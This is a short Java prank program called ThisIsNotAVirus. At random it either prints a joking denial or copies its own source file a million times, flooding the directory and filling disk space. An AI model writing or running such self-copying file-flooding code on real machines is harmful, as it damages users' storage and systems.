import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.PrintWriter;
import java.util.Scanner;

class ThisIsNotAVirus {
    public static void main(String[] args) throws FileNotFoundException {
        boolean isVirus = Math.random() > 0.5;
        if (isVirus) {
            for (int i = 0; i < 1000000; i++) {
                PrintWriter out = new PrintWriter("ThisIsNotAVirus" + i + ".java");
                FileReader reader = new FileReader("ThisIsNotAVirus.java");
                Scanner in = new Scanner(reader);
                while (in.hasNextLine()) {
                    String line = in.nextLine();
                    out.println(line);
                }
                in.close();
                out.close();
            }
        } else {
            System.out.println("I told you I am not a virus! :(");
        }
    }
}
